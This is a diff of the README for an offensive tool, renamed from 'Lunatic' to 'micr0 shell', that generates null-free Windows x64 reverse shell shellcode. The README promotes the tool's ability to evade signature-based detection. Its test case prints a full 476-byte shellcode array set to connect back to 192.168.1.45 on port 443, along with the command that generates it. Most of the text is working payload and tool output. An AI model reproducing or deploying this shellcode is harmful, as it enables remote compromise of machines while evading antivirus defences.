@@ -1,4 +1,4 @@
-# Lunatic
+# micr0 shell
 `micr0 shell` is a Python script that dynamically generates PIC Null-Free reverse shell shellcode. It is light, convenient, and fast. Generated shellcode can be `27 bytes` smaller than MSF's shellcode (Do not contain `0x00`) at most, depending on supplied shellcode options. Generated shellcode can also be used to evade signature-based detection, considering MSF's shellcode is used widely.
 
 
@@ -18,7 +18,7 @@ To make the shellcode work well, only the `IP address` must be specified. The de
 
 
 ## Known Issues
-1. According to the supplied IP address, port, and shell type, Lunatic dynamically generates Null-Free shellcode. I have considered most of the common situations that could generate Null bytes, however, I am aware that if the supplied IP address contains `.255` and `.0` at the same time, for instance, if the IP address is `192.168.0.255`, generated shellcode will contain Null byte. This type of IP address could be rare in practice, and eliminating Null byte for all IP addresses would add more complexity. Therefore, I do not intend to improve this part recently.
+1. According to the supplied IP address, port, and shell type, micr0 shell dynamically generates Null-Free shellcode. I have considered most of the common situations that could generate Null bytes, however, I am aware that if the supplied IP address contains `.255` and `.0` at the same time, for instance, if the IP address is `192.168.0.255`, generated shellcode will contain Null byte. This type of IP address could be rare in practice, and eliminating Null byte for all IP addresses would add more complexity. Therefore, I do not intend to improve this part recently.
 
 2. Regarding the port value, in theory, any port will not generate Null byte. However, due to the implementation of eliminating Null-byte, port `65280` is not usable.
 
@@ -28,18 +28,17 @@ To make the shellcode work well, only the `IP address` must be specified. The de
 ## Test Case
 
 ```cmd
-python Lunatic.py --ip 192.168.0.45 --port 443 --variable buffer --shell cmd --language c --execution false
+─# python3 micr0shell.py --ip 192.168.1.45 --port 443 --type cmd --language csharp --variable sc --execution false --save True --output sc.bin
 
-
-██╗░░░░░██╗░░░██╗███╗░░██╗░█████╗░████████╗██╗░█████╗░
-██║░░░░░██║░░░██║████╗░██║██╔══██╗╚══██╔══╝██║██╔══██╗
-██║░░░░░██║░░░██║██╔██╗██║███████║░░░██║░░░██║██║░░╚═╝
-██║░░░░░██║░░░██║██║╚████║██╔══██║░░░██║░░░██║██║░░██╗
-███████╗╚██████╔╝██║░╚███║██║░░██║░░░██║░░░██║╚█████╔╝
-╚══════╝░╚═════╝░╚═╝░░╚══╝╚═╝░░╚═╝░░░╚═╝░░░╚═╝░╚════╝░
+███╗░░░███╗██╗░█████╗░██████╗░░█████╗░  ░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
+████╗░████║██║██╔══██╗██╔══██╗██╔══██╗  ██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
+██╔████╔██║██║██║░░╚═╝██████╔╝██║░░██║  ╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
+██║╚██╔╝██║██║██║░░██╗██╔══██╗██║░░██║  ░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
+██║░╚═╝░██║██║╚█████╔╝██║░░██║╚█████╔╝  ██████╔╝██║░░██║███████╗███████╗███████╗
+╚═╝░░░░░╚═╝╚═╝░╚════╝░╚═╝░░╚═╝░╚════╝░  ╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝
 
 Author: Senzee
-Github Repository: https://github.com/senzee1984/Lunatic
+Github Repository: https://github.com/senzee1984/micr0_shell
 Description: Dynamically generate PIC Null-Free Reverse Shell Shellcode
 Attention: In rare cases (.255 and .0 co-exist), generated shellcode could contain NULL bytes, E.G. when IP is 192.168.0.255
 
@@ -47,17 +46,18 @@ Attention: In rare cases (.255 and .0 co-exist), generated shellcode could conta
 [+]Shellcode Settings:
 ******** IP Address: 192.168.1.45
 ******** Listening Port: 443
-******** Language of desired shellcode runner: c
-******** Shellcode array variable name: buffer
+******** Language of desired shellcode runner: csharp
+******** Shellcode array variable name: sc
 ******** Shell: cmd
 ******** Shellcode Execution: false
+******** Save Shellcode to file: true
 
 
 [+]Payload size: 476 bytes
 
-[+]Shellcode format for C
+[+]Shellcode format for C#
 
-unsigned char buffer[]={
+byte[] sc= new byte[476] {
 0x48,0x31,0xd2,0x65,0x48,0x8b,0x42,0x60,0x48,0x8b,0x70,0x18,0x48,0x8b,0x76,0x20,0x4c,0x8b,0x0e,0x4d,
 0x8b,0x09,0x4d,0x8b,0x49,0x20,0xeb,0x63,0x41,0x8b,0x49,0x3c,0x4d,0x31,0xff,0x41,0xb7,0x88,0x4d,0x01,
 0xcf,0x49,0x01,0xcf,0x45,0x8b,0x3f,0x4d,0x01,0xcf,0x41,0x8b,0x4f,0x18,0x45,0x8b,0x77,0x20,0x4d,0x01,
@@ -82,4 +82,7 @@ unsigned char buffer[]={
 0xff,0xc1,0x66,0x51,0x48,0x31,0xc9,0x66,0x51,0x66,0x51,0x51,0x51,0x51,0x51,0x51,0x51,0xb1,0x68,0x51,
 0x48,0x89,0xe7,0x48,0x89,0xe1,0x48,0x83,0xe9,0x20,0x51,0x57,0x48,0x31,0xc9,0x51,0x51,0x51,0x48,0xff,
 0xc1,0x51,0xfe,0xc9,0x51,0x51,0x51,0x51,0x49,0x89,0xc8,0x49,0x89,0xc9,0xff,0xd0};
+
+
+Generated shellcode successfully saved in file sc.bin
 ```
